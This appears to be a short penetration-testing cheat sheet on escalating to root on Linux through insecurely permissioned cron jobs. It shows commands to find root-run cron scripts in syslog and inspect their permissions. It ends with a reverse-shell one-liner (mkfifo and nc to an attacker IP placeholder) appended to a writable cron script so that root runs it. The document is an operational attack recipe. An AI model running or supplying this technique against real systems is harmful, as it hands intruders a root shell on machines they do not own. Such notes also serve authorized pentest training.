On a Linux system, the cron time-based job scheduler is a prime target, since system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.

# Enumeration
```bash
grep "CRON" /var/log/syslog
```
Example vulnerable log showing root running a script in a user writeable directory:
![image](https://github.com/user-attachments/assets/93cf4552-bb6f-4bb0-b373-e6a84ff5afcf)

## Inspect Content/Permissions of cron job
```bash
ls -lah /home/joe/.scripts/user_backups.sh
```
```bash
cat /home/joe/.scripts/user_backups.sh
```
### Revshell Oneliner
If the cronjob can be overwritten:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(ATTACKER IP) $(PORT) >/tmp/f" >> $(CRONJOB_FILE)
```
